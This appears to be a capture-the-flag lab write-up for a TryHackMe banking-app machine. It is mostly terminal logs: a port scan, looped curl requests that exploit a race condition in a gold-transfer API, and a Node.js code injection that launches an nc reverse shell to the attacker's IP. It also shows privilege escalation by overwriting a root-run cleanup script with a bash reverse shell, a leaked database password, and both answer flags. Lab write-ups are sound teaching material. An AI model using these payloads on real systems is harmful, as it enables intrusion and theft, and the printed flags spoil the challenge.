----
It's time for another heist.
----

![](https://tryhackme-images.s3.amazonaws.com/room-icons/4dc3ec5fff2bed9041875393f0f72a1e.jpeg)

### Task 1  Flags

 Start Machine

Hack into the machine and capture both the user and root flags! It's pretty hard, so good luck.

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.198.17 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.198.17:22
Open 10.10.198.17:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-11 19:25 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:25
Completed NSE at 19:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:25
Completed NSE at 19:25, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:25
Completed NSE at 19:25, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 19:25
Completed Parallel DNS resolution of 1 host. at 19:25, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 19:25
Scanning 10.10.198.17 [2 ports]
Discovered open port 80/tcp on 10.10.198.17
Discovered open port 22/tcp on 10.10.198.17
Completed Connect Scan at 19:25, 0.23s elapsed (2 total ports)
Initiating Service scan at 19:25
Scanning 2 services on 10.10.198.17
Completed Service scan at 19:25, 6.58s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.198.17.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:25
Completed NSE at 19:25, 11.01s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:25
Completed NSE at 19:25, 0.95s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:25
Completed NSE at 19:25, 0.00s elapsed
Nmap scan report for 10.10.198.17
Host is up, received user-set (0.22s latency).
Scanned at 2023-07-11 19:25:37 EDT for 19s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 519153a5af1a5a786762aed637a08e33 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxnwgBjCjyJ+aWd6heYTvHySh7tEBlAO3Jv/wzZZe1Qo0dj4ZLzGohKkWBfsqH3zXqQn+nWOXKjLNMlGSfPmSNVtY5vWa+SNHZIkvyILsv0NgoPwU4QB4TVP5DCGiz6tBYk92j26vLmP0kxD+sd7KNmmRHnjrVd8WhWhjGCzcGUte5tAnxNGHZUPyX9o6m0LsbC1goWrQSyJ6dGFtausj5IzVGA9wO+vJD577KMy74QvLywLEe8KkNsjbejBphFsmz849OE9fq0Y+cfZbIdYQtQCD0ARC5SCluZ+c8BUB3G+c7ZanGyIzWV695dKYR/dru7/ElBT9xkwMlNZf2giNv
|   256 c17072cc82c3f33e5e0a6a054ef04c3c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKgVewqlT05Af1S9+0VideqdvN07wONAqm8iHSiQ/9mD3WS6uAeJzdfz8uX328uXfpaynISu12WuBQkki+1iYQY=
|   256 a2ea537ce1d760bcd39208a99d206b7d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHg5lLniSCVt74z0uR1M/dCYjDnVWT8PdHCIJjk5eH5J
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:25
Completed NSE at 19:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:25
Completed NSE at 19:25, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:25
Completed NSE at 19:25, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.46 seconds

Welcome to racetrack bank, the bank that (will soon) let you transfer funds with racing speed! 

creating an acc
POST /api/create HTTP/1.1
Cookie: connect.sid=s%3A_41Hrgv7gl7l4asuESZn1yY3iUeRDZ-2.YZR2xutiObhIw9kYf4%2BYFJvXD%2F7jx0YLtkgGfeAKajw
username=witty&password=witty123&password2=witty123

Welcome to Racetrack Bank! To get you started, we have given you 1 gold (how generous of us!). Spend it wisely.

http://10.10.198.17/purchase.html

Premium Account 	This is our famous premium account. It may seem a bit overpriced, but it's totally worth it! It gives you access to some juicy extra features to play with!
What's that? You want to know what the features are? It's a surprise... 	10,000 gold 

You do not have enough gold.

changing to 200 ok

http://10.10.198.17/api/buypremium
Found. Redirecting to /purchase.html?error=You%20do%20not%20have%20enough%20gold.

http://10.10.198.17/giving.html

We're all about the generosity here at Racetrack Bank. Use the form below to give gold to your friends!

Note: to see if you have recieved gold, you will need to refresh your page.
Username: Amount of Gold: 

so we can create another acc

test:test123

cookie
s%3AcA-fvilK7YTPyttaAaT7T3GzsiJBRXh4.8xcpht6d5lKmHv%2F7ybtGOLULk4uw39D%2BTdr8rZn3ggI

giving gold 1 to test

Gold: 2 yes it works

https://www.npmjs.com/package/racetrack

Racetrack is a way to make sure that all your async calls are completed, and to find out where they went wrong if any of them are not completed.


#!/bin/bash
# Loop a curl request and make the request pretty much asyncronous by using &. sleep for .1

┌──(witty㉿kali)-[~/Downloads]
└─$ for i in {1..10000}; do sleep .1; curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.198.17' -H $'Referer: http://10.10.198.17/giving.html' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Connection: close' -H $'Cookie: connect.sid=s%3AcA-fvilK7YTPyttaAaT7T3GzsiJBRXh4.8xcpht6d5lKmHv%2F7ybtGOLULk4uw39D%2BTdr8rZn3ggI' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'s%3A_41Hrgv7gl7l4asuESZn1yY3iUeRDZ-2.YZR2xutiObhIw9kYf4%2BYFJvXD%2F7jx0YLtkgGfeAKajw' \
    --data-binary $'user=witty&amount=1' \
    $'http://10.10.198.17/api/givegold' & done

witty gold 16

┌──(witty㉿kali)-[~/Downloads]
└─$ for i in {1..10000}; do sleep .1; curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.198.17' -H $'Referer: http://10.10.198.17/giving.html' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Connection: close' -H $'Cookie: connect.sid=s%3A_41Hrgv7gl7l4asuESZn1yY3iUeRDZ-2.YZR2xutiObhIw9kYf4%2BYFJvXD%2F7jx0YLtkgGfeAKajw' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'s%3AcA-fvilK7YTPyttaAaT7T3GzsiJBRXh4.8xcpht6d5lKmHv%2F7ybtGOLULk4uw39D%2BTdr8rZn3ggI' \
    --data-binary $'user=test&amount=5' \
    $'http://10.10.198.17/api/givegold' & done

then witty 1 and test 130 incrementing amount to 100 let's see

┌──(witty㉿kali)-[~/Downloads]
└─$ for i in {1..10000}; do sleep .1; curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.198.17' -H $'Referer: http://10.10.198.17/giving.html' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Connection: close' -H $'Cookie: connect.sid=s%3AcA-fvilK7YTPyttaAaT7T3GzsiJBRXh4.8xcpht6d5lKmHv%2F7ybtGOLULk4uw39D%2BTdr8rZn3ggI' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'s%3A_41Hrgv7gl7l4asuESZn1yY3iUeRDZ-2.YZR2xutiObhIw9kYf4%2BYFJvXD%2F7jx0YLtkgGfeAKajw' \
    --data-binary $'user=witty&amount=100' \
    $'http://10.10.198.17/api/givegold' & done

then witty 1001 let's give 1000 to test

and test has Gold: 9030 

┌──(witty㉿kali)-[~/Downloads]
└─$ for i in {1..10000}; do sleep .1; curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.198.17' -H $'Referer: http://10.10.198.17/giving.html' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Connection: close' -H $'Cookie: connect.sid=s%3A_41Hrgv7gl7l4asuESZn1yY3iUeRDZ-2.YZR2xutiObhIw9kYf4%2BYFJvXD%2F7jx0YLtkgGfeAKajw' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'s%3AcA-fvilK7YTPyttaAaT7T3GzsiJBRXh4.8xcpht6d5lKmHv%2F7ybtGOLULk4uw39D%2BTdr8rZn3ggI' \
    --data-binary $'user=test&amount=1000' \
    $'http://10.10.198.17/api/givegold' & done

and finally from test to witty :) 

┌──(witty㉿kali)-[~/Downloads]
└─$ for i in {1..10000}; do sleep .1; curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.198.17' -H $'Referer: http://10.10.198.17/giving.html' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Connection: close' -H $'Cookie: connect.sid=s%3AcA-fvilK7YTPyttaAaT7T3GzsiJBRXh4.8xcpht6d5lKmHv%2F7ybtGOLULk4uw39D%2BTdr8rZn3ggI' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'s%3A_41Hrgv7gl7l4asuESZn1yY3iUeRDZ-2.YZR2xutiObhIw9kYf4%2BYFJvXD%2F7jx0YLtkgGfeAKajw' \
    --data-binary $'user=witty&amount=5000' \
    $'http://10.10.198.17/api/givegold' & done
[2] 840068
[3] 840070
[4] 840072
[5] 840074
[6] 840076
[7] 840078
[8] 840084
[9] 840086
[10] 840088
[11] 840090
[12] 840092
[13] 840094
[14] 840096
[15] 840098
[16] 840100
HTTP/1.1 302 Found
HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 12 Jul 2023 00:03:21 GMT
Date: Wed, 12 Jul 2023 00:03:21 GMT
Content-Type: text/plain; charset=utf-8
Content-Type: text/plain; charset=utf-8
Content-Length: 51
Connection: close
X-Powered-By: Express
Cache-Control: no-store
Content-Length: 79
Connection: close
Location: /giving.html?success=Success!
X-Powered-By: Express
Vary: Accept
Cache-Control: no-store

Location: /giving.html?error=You%20do%20not%20have%20enough%20gold.
Vary: Accept

Found. Redirecting to /giving.html?success=Success!Found. Redirecting to /giving.html?error=You%20do%20not%20have%20enough%20gold.[3]    done       curl -i -s -k -X $'POST' -H $'Host: 10.10.198.17' -H  -H  -H  -H  -H  -b    
[12]    done       curl -i -s -k -X $'POST' -H $'Host: 10.10.198.17' -H  -H  -H  -H  -H  -b    
[3] 840106
HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 12 Jul 2023 00:03:21 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 51
Connection: close
X-Powered-By: Express
Cache-Control: no-store
Location: /giving.html?success=Success!
Vary: Accept

Found. Redirecting to /giving.html?success=Success![4]    done       curl -i -s -k -X $'POST' -H $'Host: 10.10.198.17' -H  -H  -H  -H  -H  -b    
[4] 840108
HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 12 Jul 2023 00:03:21 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 79
Connection: close
X-Powered-By: Express
Cache-Control: no-store
Location: /giving.html?error=You%20do%20not%20have%20enough%20gold.
Vary: Accept

Found. Redirecting to /giving.html?error=You%20do%20not%20have%20enough%20gold.HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 12 Jul 2023 00:03:21 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 51
Connection: close
X-Powered-By: Express
Cache-Control: no-store
Location: /giving.html?success=Success!
Vary: Accept

Gold: 40001  Race conditions

let's purchase premium acc

http://10.10.198.17/premiumfeatures.html

X-Powered-By: Express

process.cwd()

The answer is /home/brian/website.

Utilizamos el payload `process.cwd()` para verificar el PATH donde esta la pagina ejecutandose, nos devuelve la carpeta principal de uno de los usuarios, el payload funciona y podemos intentar obtener una shell utilizando `require()`

https://nodejs.org/api/child_process.html#child_process_child_process_exec_command_options_callback

require("child_process").exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.19.103 4444 >/tmp/f')

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvp 4444                                      
listening on [any] 4444 ...
10.10.198.17: inverse host lookup failed: Unknown host
connect to [10.8.19.103] from (UNKNOWN) [10.10.198.17] 39920
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
brian@racetrack:~/website$ id
id
uid=1000(brian) gid=1000(brian) groups=1000(brian)

brian@racetrack:~/website$ cd ..
cd ..
brian@racetrack:~$ ls
ls
admin  cleanup  user.txt  website
brian@racetrack:~$ cat user.txt
cat user.txt
THM{178c31090a7e0f69560730ad21d90e70}

brian@racetrack:~/website/server$ cat middleware.js
cat middleware.js
const db = require('./db');

module.exports = {
    requireAuthMiddleware: async (req, res, next) => {
        if(req.session.userId !== undefined){
            req.mustache = (await db.query('SELECT name, gold, premium FROM users WHERE id=$1', [req.session.userId]))[0];

            next();
        }else {
            res.status(401).redirect('/login.html');
        }
    }
}
brian@racetrack:~/website/server$ cat db.js
cat db.js
const { Client } = require('pg');
const path = require('path');

const client = new Client({
	connectionString: require('./databaseurl.js')
});

client.connect();

module.exports = {
    query: async (...args) => {
        return (await client.query(...args)).rows;
    }
}

brian@racetrack:~/website/server$ cat databaseurl.js
cat databaseurl.js
module.exports = "postgres://brian:superstrongpass@localhost:5432/racetrackbank";

brian@racetrack:~/website/server$ sudo -s
sudo -s
[sudo] password for brian: superstrongpass

Sorry, try again.
[sudo] password for brian: 

Sorry, try again.
[sudo] password for brian: 

sudo: 3 incorrect password attempts

brian@racetrack:~$ cd cleanup
cd cleanup
brian@racetrack:~/cleanup$ ls
ls
cleanupscript.sh
brian@racetrack:~/cleanup$ cat cleanupscript.sh
cat cleanupscript.sh
rm testfile.txt
brian@racetrack:~/cleanup$ ls -lah
ls -lah
total 12K
drwxr-xr-x  2 brian brian 4.0K Apr 23  2020 .
drwxr-xr-x 11 brian brian 4.0K Apr 23  2020 ..
-rwxr--r--  1 root  root    17 Apr 23  2020 cleanupscript.sh

brian@racetrack:~/cleanup$ echo "test" > hi
echo "test" > hi
brian@racetrack:~/cleanup$ ls -lah
ls -lah
total 16K
drwxr-xr-x  2 brian brian 4.0K Jul 12 00:20 .
drwxr-xr-x 11 brian brian 4.0K Apr 23  2020 ..
-rwxr--r--  1 root  root    17 Apr 23  2020 cleanupscript.sh
-rw-r--r--  1 brian brian    5 Jul 12 00:20 hi

brian@racetrack:/tmp$ wget http://10.8.19.103:1234/pspy64
wget http://10.8.19.103:1234/pspy64
--2023-07-12 00:22:02--  http://10.8.19.103:1234/pspy64
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

2023-07-12 00:22:05 (1.02 MB/s) - ‘pspy64’ saved [3104768/3104768]

brian@racetrack:/tmp$ chmod +x pspy64
chmod +x pspy64
brian@racetrack:/tmp$ ./pspy64
./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2023/07/12 00:22:21 CMD: UID=1000  PID=1924   | ./pspy64 
2023/07/12 00:22:21 CMD: UID=0     PID=1922   | 
2023/07/12 00:22:21 CMD: UID=0     PID=1857   | 
2023/07/12 00:22:21 CMD: UID=1000  PID=1795   | /bin/bash 
2023/07/12 00:22:21 CMD: UID=1000  PID=1793   | python3 -c import pty; pty.spawn('/bin/bash') 
2023/07/12 00:22:21 CMD: UID=1000  PID=1787   | nc 10.8.19.103 4444 
2023/07/12 00:22:21 CMD: UID=1000  PID=1786   | /bin/sh -i 
2023/07/12 00:22:21 CMD: UID=1000  PID=1785   | cat /tmp/f 
2023/07/12 00:22:21 CMD: UID=1000  PID=1782   | /bin/sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.19.103 4444 >/tmp/f 
2023/07/12 00:22:21 CMD: UID=0     PID=1734   | 
2023/07/12 00:22:21 CMD: UID=0     PID=1475   | 
2023/07/12 00:22:21 CMD: UID=111   PID=1168   | postgres: 10/main: brian racetrackbank 127.0.0.1(48356) idle                                                              
2023/07/12 00:22:21 CMD: UID=1000  PID=1088   | node /home/brian/website/server/index.js                   
2023/07/12 00:22:21 CMD: UID=1000  PID=1057   | PM2 v4.3.1: God Daemon (/home/brian/.pm2)    
2023/07/12 00:22:21 CMD: UID=111   PID=952    | postgres: 10/main: bgworker: logical replication launcher                                                                 
2023/07/12 00:22:21 CMD: UID=111   PID=951    | postgres: 10/main: stats collector process                                                                                
2023/07/12 00:22:21 CMD: UID=111   PID=950    | postgres: 10/main: autovacuum launcher process                                                                            
2023/07/12 00:22:21 CMD: UID=111   PID=949    | postgres: 10/main: wal writer process                                                                                     
2023/07/12 00:22:21 CMD: UID=111   PID=948    | postgres: 10/main: writer process                                                                                         
2023/07/12 00:22:21 CMD: UID=111   PID=947    | postgres: 10/main: checkpointer process                                                                                   
2023/07/12 00:22:21 CMD: UID=111   PID=943    | /usr/lib/postgresql/10/bin/postgres -D /var/lib/postgresql/10/main -c config_file=/etc/postgresql/10/main/postgresql.conf 
2023/07/12 00:22:21 CMD: UID=33    PID=897    | nginx: worker process                            
2023/07/12 00:22:21 CMD: UID=0     PID=896    | nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
2023/07/12 00:22:21 CMD: UID=0     PID=895    | /usr/lib/policykit-1/polkitd --no-debug 
2023/07/12 00:22:21 CMD: UID=0     PID=890    | /usr/sbin/sshd -D 
2023/07/12 00:22:21 CMD: UID=0     PID=887    | /sbin/agetty -o -p -- \u --noclear tty1 linux 
2023/07/12 00:22:21 CMD: UID=0     PID=875    | /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal 
2023/07/12 00:22:21 CMD: UID=0     PID=871    | /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220 
2023/07/12 00:22:21 CMD: UID=0     PID=861    | /usr/lib/snapd/snapd 
2023/07/12 00:22:21 CMD: UID=1     PID=853    | /usr/sbin/atd -f 
2023/07/12 00:22:21 CMD: UID=0     PID=851    | /usr/bin/lxcfs /var/lib/lxcfs/ 
2023/07/12 00:22:21 CMD: UID=0     PID=850    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 
2023/07/12 00:22:21 CMD: UID=0     PID=844    | /usr/lib/accountsservice/accounts-daemon 
2023/07/12 00:22:21 CMD: UID=0     PID=837    | /lib/systemd/systemd-logind 
2023/07/12 00:22:21 CMD: UID=102   PID=833    | /usr/sbin/rsyslogd -n 
2023/07/12 00:22:21 CMD: UID=103   PID=832    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
2023/07/12 00:22:21 CMD: UID=0     PID=830    | /usr/sbin/cron -f 
2023/07/12 00:22:21 CMD: UID=101   PID=748    | /lib/systemd/systemd-resolved 
2023/07/12 00:22:21 CMD: UID=100   PID=731    | /lib/systemd/systemd-networkd 
2023/07/12 00:22:21 CMD: UID=62583 PID=559    | /lib/systemd/systemd-timesyncd 
2023/07/12 00:22:21 CMD: UID=0     PID=512    | 
2023/07/12 00:22:21 CMD: UID=0     PID=509    | 
2023/07/12 00:22:21 CMD: UID=0     PID=454    | /lib/systemd/systemd-udevd 
2023/07/12 00:22:21 CMD: UID=0     PID=446    | /sbin/lvmetad -f 
2023/07/12 00:22:21 CMD: UID=0     PID=423    | 
2023/07/12 00:22:21 CMD: UID=0     PID=416    | 
2023/07/12 00:22:21 CMD: UID=0     PID=407    | 
2023/07/12 00:22:21 CMD: UID=0     PID=406    | 
2023/07/12 00:22:21 CMD: UID=0     PID=403    | 
2023/07/12 00:22:21 CMD: UID=0     PID=402    | 
2023/07/12 00:22:21 CMD: UID=0     PID=401    | /lib/systemd/systemd-journald 
2023/07/12 00:22:21 CMD: UID=0     PID=386    | 
2023/07/12 00:22:21 CMD: UID=0     PID=314    | 
2023/07/12 00:22:21 CMD: UID=0     PID=313    | 
2023/07/12 00:22:21 CMD: UID=0     PID=264    | 
2023/07/12 00:22:21 CMD: UID=0     PID=171    | 
2023/07/12 00:22:21 CMD: UID=0     PID=166    | 
2023/07/12 00:22:21 CMD: UID=0     PID=117    | 
2023/07/12 00:22:21 CMD: UID=0     PID=99     | 
2023/07/12 00:22:21 CMD: UID=0     PID=90     | 
2023/07/12 00:22:21 CMD: UID=0     PID=84     | 
2023/07/12 00:22:21 CMD: UID=0     PID=83     | 
2023/07/12 00:22:21 CMD: UID=0     PID=82     | 
2023/07/12 00:22:21 CMD: UID=0     PID=81     | 
2023/07/12 00:22:21 CMD: UID=0     PID=80     | 
2023/07/12 00:22:21 CMD: UID=0     PID=79     | 
2023/07/12 00:22:21 CMD: UID=0     PID=37     | 
2023/07/12 00:22:21 CMD: UID=0     PID=36     | 
2023/07/12 00:22:21 CMD: UID=0     PID=35     | 
2023/07/12 00:22:21 CMD: UID=0     PID=32     | 
2023/07/12 00:22:21 CMD: UID=0     PID=31     | 
2023/07/12 00:22:21 CMD: UID=0     PID=30     | 
2023/07/12 00:22:21 CMD: UID=0     PID=29     | 
2023/07/12 00:22:21 CMD: UID=0     PID=28     | 
2023/07/12 00:22:21 CMD: UID=0     PID=27     | 
2023/07/12 00:22:21 CMD: UID=0     PID=26     | 
2023/07/12 00:22:21 CMD: UID=0     PID=25     | 
2023/07/12 00:22:21 CMD: UID=0     PID=24     | 
2023/07/12 00:22:21 CMD: UID=0     PID=23     | 
2023/07/12 00:22:21 CMD: UID=0     PID=22     | 
2023/07/12 00:22:21 CMD: UID=0     PID=21     | 
2023/07/12 00:22:21 CMD: UID=0     PID=20     | 
2023/07/12 00:22:21 CMD: UID=0     PID=18     | 
2023/07/12 00:22:21 CMD: UID=0     PID=17     | 
2023/07/12 00:22:21 CMD: UID=0     PID=16     | 
2023/07/12 00:22:21 CMD: UID=0     PID=15     | 
2023/07/12 00:22:21 CMD: UID=0     PID=14     | 
2023/07/12 00:22:21 CMD: UID=0     PID=13     | 
2023/07/12 00:22:21 CMD: UID=0     PID=12     | 
2023/07/12 00:22:21 CMD: UID=0     PID=11     | 
2023/07/12 00:22:21 CMD: UID=0     PID=10     | 
2023/07/12 00:22:21 CMD: UID=0     PID=9      | 
2023/07/12 00:22:21 CMD: UID=0     PID=8      | 
2023/07/12 00:22:21 CMD: UID=0     PID=7      | 
2023/07/12 00:22:21 CMD: UID=0     PID=6      | 
2023/07/12 00:22:21 CMD: UID=0     PID=4      | 
2023/07/12 00:22:21 CMD: UID=0     PID=2      | 
2023/07/12 00:22:21 CMD: UID=0     PID=1      | /sbin/init maybe-ubiquity 
2023/07/12 00:22:23 CMD: UID=111   PID=1931   | postgres: 10/main: autovacuum worker process   postgres                                                                   
2023/07/12 00:22:44 CMD: UID=111   PID=1932   | postgres: 10/main: brian racetrackbank 127.0.0.1(37848) idle                                                              
2023/07/12 00:23:01 CMD: UID=0     PID=1942   | rm testfile.txt 
2023/07/12 00:23:01 CMD: UID=0     PID=1941   | /bin/sh ./cleanupscript.sh 

brian@racetrack:~/cleanup$ ls
ls
cleanupscript.sh  hi
brian@racetrack:~/cleanup$ mv cleanupscript.sh cleanupscript.sh.bak
mv cleanupscript.sh cleanupscript.sh.bak
brian@racetrack:~/cleanup$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.19.103 1337 >/tmp/f" > cleanupscript.sh
 2>&1|nc 10.8.19.103 1337 >/tmp/f" > cleanupscript.sh 
brian@racetrack:~/cleanup$ chmod +x cleanupscript.sh
chmod +x cleanupscript.sh
brian@racetrack:~/cleanup$ ls -lah
ls -lah
total 20K
drwxr-xr-x  2 brian brian 4.0K Jul 12 00:29 .
drwxr-xr-x 11 brian brian 4.0K Apr 23  2020 ..
-rwxr-xr-x  1 brian brian   81 Jul 12 00:29 cleanupscript.sh
-rwxr--r--  1 root  root    17 Apr 23  2020 cleanupscript.sh.bak
-rw-r--r--  1 brian brian    5 Jul 12 00:20 hi


┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvp 1337
listening on [any] 1337 ...
10.10.198.17: inverse host lookup failed: Unknown host
connect to [10.8.19.103] from (UNKNOWN) [10.10.198.17] 35378
bash: cannot set terminal process group (2048): Inappropriate ioctl for device
bash: no job control in this shell
root@racetrack:/home/brian/cleanup# cd /root
cd /root
root@racetrack:~# ls
ls
root.txt
root@racetrack:~# cat root.txt
cat root.txt
THM{55a9d6099933f6c456ccb2711b8766e3}


```

![[Pasted image 20230711190111.png]]

User flag

What does the name of the bank hint at?

*THM{178c31090a7e0f69560730ad21d90e70}*

Root flag

Experiment and be creative.

*THM{55a9d6099933f6c456ccb2711b8766e3}*

[[Carpe Diem 1]]